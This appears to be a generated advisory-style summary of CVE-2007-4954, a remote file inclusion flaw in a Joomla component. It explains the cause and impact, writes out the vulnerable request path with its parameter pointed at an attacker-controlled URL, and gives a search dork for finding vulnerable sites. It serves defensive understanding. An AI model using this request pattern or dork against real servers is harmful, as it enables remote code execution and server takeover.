Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-4954

**Vulnerability Description:**

*   **Root Cause:** The vulnerability is a Remote File Inclusion (RFI) flaw in the `admin.joom12pic.php` file of the `com_joom12pic` component for Joomla.
*   **Weaknesses/Vulnerabilities Present:** The `mosConfig_live_site` parameter is used in a way that allows an attacker to include a remote file. The application does not properly sanitize or validate the input provided to this parameter, thus making it vulnerable to RFI.
*   **Impact of Exploitation:** Successful exploitation of this vulnerability would allow an attacker to include and execute arbitrary code on the server. This could result in:
    *   Complete compromise of the web server.
    *   Data theft or manipulation.
    *   Installation of backdoors.
    *   Denial of service.
*   **Attack Vectors:**
    *   The vulnerability can be exploited by sending a specially crafted HTTP request to the vulnerable script, using the `mosConfig_live_site` parameter to specify a remote malicious file.
    *   An attacker can use a web browser or any tool capable of sending HTTP requests to exploit the vulnerability.
*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to send HTTP requests to the affected Joomla installation.
    *   The attacker needs to host a malicious file on a publicly accessible server.

**Technical Details:**

The vulnerable file and parameter is: `/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=[attacker-controlled-URL]`

The exploit consists of setting the `mosConfig_live_site` parameter to the URL of a malicious file that the attacker controls, causing the vulnerable application to include this file into the server.

**Additional Information:**

*   The exploit-db entry provides a dork `"com_joom12pic"` which can be used to find vulnerable instances of this Joomla component.
*   The identified vulnerability is a Remote File Inclusion vulnerability.
